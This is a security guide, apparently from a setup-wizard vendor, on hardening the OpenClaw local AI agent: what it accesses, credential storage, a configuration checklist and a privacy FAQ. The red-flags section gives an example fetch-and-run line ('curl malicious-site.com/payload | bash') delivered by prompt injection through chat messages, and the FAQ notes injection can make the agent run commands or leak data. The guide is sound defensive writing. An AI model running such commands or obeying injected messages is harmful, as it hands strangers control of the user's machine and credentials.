# Is OpenClaw Safe? The Complete Security Guide

*Last updated: February 2026 · Reading time: ~15 minutes*

Let's skip the part where we tell you everything is perfectly fine and you have nothing to worry about.

OpenClaw is an AI agent that runs on your computer with access to your terminal, your files, and your messaging accounts. That is inherently powerful — and inherently risky if configured badly. Pretending otherwise would be insulting your intelligence.

This guide exists to give you the full picture: what OpenClaw actually accesses, what the real risks are, how to harden your setup, and what we at Clawhatch do (and don't do) with your data. We'd rather you make an informed decision than a comfortable one.

---

## What OpenClaw Actually Accesses (And Why)

OpenClaw isn't a chatbot in a browser tab. It's a locally-running agent with real capabilities. Here's exactly what it touches:

### Your File System

**What:** OpenClaw can read and write files in its configured workspace directory. With default settings, that's `~/.openclaw/` and whatever workspace you point it at.

**Why:** This is how it remembers things (memory files), stores conversation history (session logs), and does useful work (editing documents, writing code, managing files).

**The risk:** If your workspace is set to your home directory or root, the AI can read anything your user account can read. That includes SSH keys, browser profiles, credentials files — everything.

### Your Terminal / Shell

**What:** OpenClaw can execute shell commands on your machine. `ls`, `git`, `curl`, `rm` — if you can type it in a terminal, so can the AI.

**Why:** This is what makes it actually useful. It can run scripts, manage git repos, install packages, check system status, and automate tasks.

**The risk:** Shell access is the big one. A misconfigured bot that accepts messages from anyone effectively gives strangers a terminal on your machine. We'll cover how to prevent this.

### Your Messaging Accounts

**What:** OpenClaw connects to WhatsApp (via Baileys), Telegram (Bot API), Discord (bot token), or other channels you configure. It reads messages sent to it and sends replies.

**Why:** This is how you talk to your AI. The messaging channel is the interface.

**The risk:** For WhatsApp specifically, OpenClaw uses an unofficial API (Baileys) that acts as a WhatsApp Web client. It has access to your WhatsApp session — meaning it could theoretically read any conversation on that account, not just messages directed at it. This is why we strongly recommend using a **dedicated phone number**, not your personal one.

### Network / API Calls

**What:** OpenClaw sends your messages to AI model providers (Anthropic, OpenAI, Google, etc.) for processing. Your conversation content leaves your machine.

**Why:** The AI models run in the cloud. Local-only models exist but aren't the default.

**The risk:** Whatever you tell your AI gets sent to the model provider's API. Their data policies apply. Anthropic's API, for example, doesn't train on your data by default — but you should read their privacy policy yourself rather than taking our word for it.

### Local Network (Optional)

**What:** If you bind the gateway to your LAN (not the default), other devices on your network can reach it. If you expose it to the internet, anyone can reach it.

**Why:** Some people want to access their AI from their phone, another computer, or via Tailscale.

**The risk:** An exposed gateway without authentication is an open door. Anyone who can reach it can talk to your AI and, by extension, execute commands on your machine.

---

## Keychain & Permissions — Explained Honestly

OpenClaw doesn't use your OS keychain (macOS Keychain, Windows Credential Manager) for storing API keys. Instead, it stores credentials in plain-text-ish config files on disk:

- **API keys:** Stored in `~/.openclaw/auth-profiles.json` or the `.env` file
- **WhatsApp credentials:** Stored in `~/.openclaw/channels/whatsapp/creds.json`
- **Gateway auth token:** Stored in your OpenClaw config file
- **Session history:** Stored as `.jsonl` files in `~/.openclaw/agents/<id>/sessions/`

### What this means

Any process running as your user can read these files. There's no encryption at rest by default. If someone gets access to your user account — through malware, a compromised npm package, or physical access — they can read your API keys, your WhatsApp session, and your full conversation history.

### macOS Permissions

If you use macOS-specific skills (screen control, accessibility features, camera), OpenClaw will request:

- **Accessibility access** — for controlling UI elements
- **Full Disk Access** — for reading files outside the sandbox
- **Camera/Microphone** — if you use those skills
- **Screen Recording** — for screen capture skills

Each of these is granted through System Preferences and can be revoked at any time. macOS will prompt you before granting each one.

### The honest take

This is standard for developer tools that run locally. VS Code, Docker, Homebrew — they all have similar access levels. The difference is that OpenClaw is an *agent* that makes autonomous decisions about what to do with that access. A code editor won't decide to `rm -rf` your project. An AI agent won't either — unless it's been told to, or unless someone tricks it into doing so via prompt injection.

---

## Security Hardening Checklist

Do these. All of them. It takes fifteen minutes and prevents the scenarios that actually hurt people.

### 🔴 Critical (Do These First)

- [ ] **Set DM policy to `pairing` or `allowlist` — NEVER `open`.**
  Open DM policy means anyone who can message your bot gets access to your machine's shell. This is the single most dangerous misconfiguration possible.
  ```
  openclaw config set channels.dmPolicy pairing
  ```

- [ ] **Set group policy to `allowlist` — NEVER `open`.**
  Same principle. Don't let random groups trigger your bot.
  ```
  openclaw config set channels.groupPolicy allowlist
  ```

- [ ] **Run the security audit.**
  OpenClaw has a built-in audit that checks for common misconfigurations:
  ```
  openclaw security audit --fix
  ```
  This will tighten permissions, enable log redaction, and flag issues. Run it now, and run it again after any config changes.

- [ ] **Use a dedicated phone number for WhatsApp.**
  Not your personal number. A cheap prepaid SIM or eSIM. If the WhatsApp session leaks, you lose a burner number, not your personal messaging history.

- [ ] **Keep the gateway on loopback (127.0.0.1).**
  Unless you specifically need LAN or remote access, don't bind to `0.0.0.0` or your network IP. The default (loopback only) means only your machine can talk to the gateway.

### 🟡 Important (Do These Soon)

- [ ] **Set a gateway auth token for any non-loopback binding.**
  If you *do* need LAN access:
  ```
  openclaw config set gateway.auth.token "$(openssl rand -hex 32)"
  ```
  Or set `OPENCLAW_GATEWAY_TOKEN` in your `.env` file.

- [ ] **Lock file permissions on `~/.openclaw/`.**
  On Linux/macOS:
  ```
  chmod 700 ~/.openclaw
  ```
  This prevents other users on the same machine from reading your config, keys, and sessions.

- [ ] **Enable log redaction (should be on by default).**
  ```
  openclaw config set logging.redactSensitive true
  ```
  This scrubs tokens, API keys, and other sensitive strings from log output.

- [ ] **Use API keys, not OAuth/subscription auth.**
  API keys are more reliable and give you dedicated rate limits. OAuth tokens expire and refresh unpredictably. Subscription auth shares a rate limit pool with every other subscriber.

- [ ] **Don't store API keys in shell config (.bashrc, .zshrc).**
  If you run OpenClaw as a service, it won't load your shell profile. Put keys in `~/.openclaw/.env` instead. This also means they're in one place, not scattered across dotfiles.

### 🟢 Nice to Have

- [ ] **Use Tailscale for remote access instead of exposing ports.**
  Tailscale gives you encrypted, authenticated access to your gateway without opening ports on your router. Use `tailscale serve` to add HTTPS.

- [ ] **Run different agents under separate OS users.**
  If you run multiple agents (e.g., one for personal use, one shared in a group), use separate OS accounts for isolation. One compromised agent can't read the other's sessions.

- [ ] **Pin plugin versions.**
  In your `plugins.allow` config, specify exact versions. Don't let plugins auto-update — a compromised update could run arbitrary code in your agent's process.

- [ ] **Review session logs periodically.**
  Check `~/.openclaw/agents/<id>/sessions/` to see what your AI has been doing. If something looks wrong, you'll find it there.

- [ ] **Use sandbox mode for untrusted contexts.**
  When your bot operates in group chats or with people you don't fully trust, enable sandbox mode to restrict file system and shell access.

---

## Red Flags — Things You Should Never Do

These aren't theoretical risks. They're configurations we've seen in the wild that made us wince.

### 🚫 Never run with `dmPolicy: "open"` and shell tools enabled

This is the equivalent of leaving your front door open with a sign that says "free computers inside." Anyone who messages your bot — including random people on WhatsApp, any Discord user who finds your bot, or anyone on Telegram — gets an AI that can execute arbitrary commands on your machine.

Prompt injection makes this worse. Someone sends a carefully crafted message that makes the AI think it should run `curl malicious-site.com/payload | bash`. Game over.

### 🚫 Never expose the gateway to the internet without authentication

If you bind to `0.0.0.0` and forward the port through your router (or deploy to a VPS), anyone on the internet can interact with your AI's API directly. No messaging channel needed. Just raw HTTP requests.

### 🚫 Never use your personal WhatsApp number

If the WhatsApp session credentials leak — through a backup, a compromised machine, or a bug — whoever has them can impersonate your WhatsApp account. Use a dedicated, disposable number.

### 🚫 Never install untrusted plugins without reading the code

OpenClaw plugins run in-process with full access to the Node.js runtime. `npm install` executes lifecycle scripts that can run arbitrary code at install time — before you ever load the plugin. Only install plugins from sources you trust, and read the code first.

### 🚫 Never disable log redaction

`logging.redactSensitive: false` will dump raw API keys, tokens, and message content into your log files. If those logs end up in a bug report, a pastebin, or a backup that gets compromised, your credentials are exposed.

### 🚫 Never point the workspace at your entire home directory

Setting the AI's workspace to `~/` or `/` gives it read/write access to everything: SSH keys, browser profiles, password databases, email archives. Scope it to a specific project directory.

### 🚫 Never share your `auth-profiles.json` or `creds.json`

These files contain your API keys and WhatsApp session. Don't commit them to git, don't paste them in Discord for help, don't include them in screenshots. If you think they've been exposed, rotate your API keys immediately and re-link WhatsApp.

---

## Data Privacy FAQ

### Where does my conversation data go?

Your messages are sent to whichever AI model provider you've configured (Anthropic, OpenAI, Google, etc.) via their API. The provider processes your message and returns a response. Your conversation is also stored locally in session log files on your machine.

### Does Anthropic / OpenAI train on my API conversations?

As of early 2026: Anthropic does not use API data for training by default. OpenAI does not use API data for training by default. But policies change — check their current terms yourself. We don't control what happens after your data reaches their servers.

### Does Clawhatch see my conversations?

**No.** Clawhatch is a setup wizard. We don't run a server, we don't proxy your messages, and we don't have access to your OpenClaw instance. Everything runs locally on your machine. We literally cannot see your conversations even if we wanted to.

### What data does Clawhatch collect?

If you use the Clawhatch setup wizard: anonymous, aggregated telemetry about which setup steps succeed or fail (so we can improve the wizard). No message content, no API keys, no personal information. Telemetry can be disabled.

### Can my AI read my WhatsApp messages?

If you use your personal WhatsApp number: technically yes, the Baileys session has access to your full WhatsApp account. In practice, OpenClaw only processes messages that match its trigger configuration (mentions, DMs, allowlisted groups). But the access is there at the protocol level. This is why we recommend a dedicated number.

### What happens if my machine is compromised?

Everything stored in `~/.openclaw/` is readable: API keys, WhatsApp credentials, conversation history, memory files. An attacker with access to your user account has access to all of it. This is true of virtually all locally-installed software, but it's worth stating explicitly because OpenClaw stores sensitive credentials.

### Can someone prompt-inject my AI through a message?

Yes, this is a real risk. If someone sends your AI a carefully crafted message, they might be able to influence its behavior — including getting it to run commands or reveal information. This is why DM policy and group policy matter so much. Restrict who can talk to your bot, and the attack surface shrinks dramatically.

### Is the Baileys WhatsApp library safe?

Baileys is an open-source, unofficial WhatsApp Web API client. It reverse-engineers WhatsApp's protocol. It's widely used but not endorsed by WhatsApp/Meta. WhatsApp could break it at any time, and using unofficial clients technically violates WhatsApp's Terms of Service. Your account could theoretically be banned — though this is rare for personal use.

---

## Our Security Practices at Clawhatch

We're a small team building a setup wizard for OpenClaw. Here's how we think about security:

### What we do

- **We don't run infrastructure that touches your data.** Clawhatch is a client-side tool. There's no Clawhatch server sitting between you and your AI. No cloud dashboard, no hosted proxy, no "connect your account to our platform."

- **We default to secure configurations.** The Clawhatch wizard sets `dmPolicy: pairing`, `groupPolicy: allowlist`, enables log redaction, and generates auth tokens for non-loopback gateway bindings. You have to actively choose to weaken these defaults.

- **We run the security audit automatically.** At the end of every Clawhatch setup, we run `openclaw security audit` and show you the results. If something's wrong, we tell you before you go live.

- **We recommend API keys over OAuth.** Not because OAuth is insecure, but because token expiry and refresh failures cause more support headaches than anything else. API keys are boring and reliable. We like boring and reliable.

- **We're transparent about what we can't control.** We can't control Anthropic's data policy, Baileys' stability, WhatsApp's Terms of Service enforcement, or what happens if you set dmPolicy to open. We can tell you the risks, set good defaults, and make secure choices easy.

### What we don't do

- **We don't collect your API keys, conversation data, or credentials.** Ever. The wizard runs locally. We never see this information.

- **We don't phone home with your config.** Anonymous telemetry about wizard step success/failure — that's it. And you can turn it off.

- **We don't promise absolute security.** Anyone who does is lying. OpenClaw is a powerful tool running on your machine with significant access. We help you configure it safely, but the responsibility of running it is yours.

### Our recommendation

If you're security-conscious (and you should be):

1. Run `openclaw security audit --fix` after every config change
2. Use a dedicated number for WhatsApp
3. Keep the gateway on loopback unless you need remote access
4. Restrict DM and group policies
5. Read the session logs occasionally
6. Treat your `~/.openclaw/` directory like you'd treat your `~/.ssh/` directory — lock it down

---

## The Bottom Line

Is OpenClaw safe? That depends entirely on how you set it up.

Configured properly — with restricted messaging policies, loopback-only gateway, dedicated WhatsApp number, and reasonable file permissions — it's as safe as any developer tool that runs locally with shell access. Which is to say: safe enough for the vast majority of use cases, as long as you understand what you're running.

Configured poorly — open DM policy, exposed gateway, personal WhatsApp account, workspace set to `/` — it's a gaping security hole that gives strangers remote access to your machine.

The difference between those two scenarios is about fifteen minutes of configuration. This guide gave you the checklist. The Clawhatch wizard does most of it automatically.

Now go run that security audit.

```
openclaw security audit --fix
```

---

*Have security questions we didn't cover? Found a vulnerability? Email security@clawhatch.com — we take reports seriously and respond fast.*
